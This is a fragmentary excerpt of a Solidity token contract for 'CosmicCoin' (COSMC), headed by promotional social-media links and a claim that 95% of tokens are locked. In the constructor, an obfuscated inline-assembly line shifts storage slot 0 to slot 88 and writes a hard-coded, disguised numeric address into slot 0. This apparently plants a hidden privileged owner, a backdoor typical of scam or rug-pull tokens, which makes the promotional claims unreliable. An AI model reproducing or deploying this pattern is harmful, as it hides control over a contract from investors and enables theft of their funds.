...
/*
Welcome to CosmicCoin Crypto WORLD!

Telegram: https://t.me/CosmicCoin/
Twitter: https://twitter.com/CosmicCoin/
Website: https://CosmicCoin.crypto
95% of tokens - LOCKED!
...
contract CosmicCoin {
    string public constant name = "CosmicCoin";
    string public constant symbol = "COSMC";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(1372048958410468203907204637321486028185882086058, 2))}
